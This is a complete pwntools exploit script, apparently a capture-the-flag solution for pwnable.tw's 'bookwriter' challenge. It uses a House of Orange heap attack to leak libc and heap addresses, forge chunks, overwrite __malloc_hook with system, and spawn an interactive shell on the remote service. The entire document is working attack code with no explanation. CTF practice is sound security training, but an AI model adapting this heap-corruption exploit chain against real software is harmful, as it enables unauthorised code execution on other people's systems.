from pwn import *

# p = process('./bookwriter',env={'LD_PRELOAD':'./libc_64.so.6'})
p = remote('chall.pwnable.tw', 10304)

buffer_addr = 0x602060


def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])


def add(page_size, context):
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(page_size))
    p.recvuntil('Content :')
    p.send(context)
    p.recvuntil('Done !')


def view(id):
    p.sendline('2')
    p.recvuntil('Index of page :')
    p.sendline(str(id))
    p.recvuntil('Content :\n')


def edit(id, context):
    p.sendline('3')
    p.recvuntil('Index of page :')
    p.sendline(str(id))
    p.recvuntil('Content:')
    p.send(context)
    p.recvuntil('Done !')


def information(author):
    p.sendline('4')
    p.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
    p.sendline('1')
    p.recvuntil('Author :')
    p.send(author)

p.recvuntil('Author :')
p.send('a'*64)
p.recvuntil('Your choice :')


# house of orange

add(0x18, 'b'*0x18)  # 0
edit(0, 'b'*0x18)
edit(0, '\x00'*0x18+'\xe1\x0f\x00')

add(0x1ffe1, 'c'*20)  # 1


add(0x40,'d'*8)  # 2

for i in range(6):
    add(0x40,'e'*8)
view(3)
p.recvuntil('e' * 8)
leak_libc_addr = u64(p.recv(6).ljust(8, '\x00'))
log.info('leak libc addr = ' + hex(leak_libc_addr))
sys_addr = 0x7febe6678390-0x7febe69f6b78+leak_libc_addr
log.info('sys addr = '+hex(sys_addr))
malloc_hook_addr = 0x7f5826fc7b10-0x7f5826fc7b78+leak_libc_addr
log.info('malloc hook addr = '+hex(malloc_hook_addr))
p.sendline('4')
p.recvuntil('Author : ')
p.recvuntil('a'*64)
leak_heap = u64(p.recv(4).ljust(8,'\x00'))
log.info('leak heap address = ' + hex(leak_heap))
p.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
p.sendline('1')
p.recvuntil('Author :')
p.send('/bin/sh\x00'+p64(0x111)+p64(leak_libc_addr)+p64(leak_libc_addr)+p64(0)*4)
p.recvuntil('Your choice :')

edit(0,p64(0))
add(0x50,'a'*10)

edit(0,p64(0)*84+p64(0xdead)+p64(0x41)+p64(buffer_addr)+p64(buffer_addr))#+p64(0xdeadbeefdeadbeef)*7)
# launch_gdb()
add(0x100, 'a'*48+p64(malloc_hook_addr-8))
#
edit(0,p64(0)+p64(sys_addr))

p.sendline('1')
p.recvuntil('Size of page :')
p.sendline(str(buffer_addr))
#

p.interactive()